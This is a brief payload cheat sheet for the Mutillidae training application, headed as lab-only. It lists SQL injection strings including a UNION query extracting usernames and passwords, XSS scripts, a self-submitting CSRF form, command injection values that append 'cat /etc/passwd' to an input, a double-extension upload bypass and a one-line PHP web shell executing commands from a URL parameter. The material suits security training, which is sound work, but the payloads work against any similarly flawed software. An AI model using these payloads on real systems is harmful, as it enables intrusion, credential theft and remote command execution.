
# Mutillidae Payload Reference

Use strictly inside the Mutillidae lab environment.

## 1. SQL Injection Payloads

```
' OR '1'='1
" OR "1"="1
' UNION SELECT null, user, password FROM accounts--
```

## 2. XSS Payloads

Reflected:

```html
<script>alert('XSS')</script>
```

Stored:

```html
"><script>confirm('stored')</script>
```

## 3. CSRF Payload

```html
<form action="http://localhost/mutillidae/changeprofile.php" method="POST">
<input type="hidden" name="email" value="attacker@test.local">
</form>
<script>document.forms[0].submit()</script>
```

## 4. Command Injection

```
127.0.0.1; ls -la
127.0.0.1 && cat /etc/passwd
```

## 5. File Upload Bypass

Rename payload:

```
shell.php.jpg
```

PHP:

```php
<?php echo shell_exec($_GET['cmd']); ?>
```

---

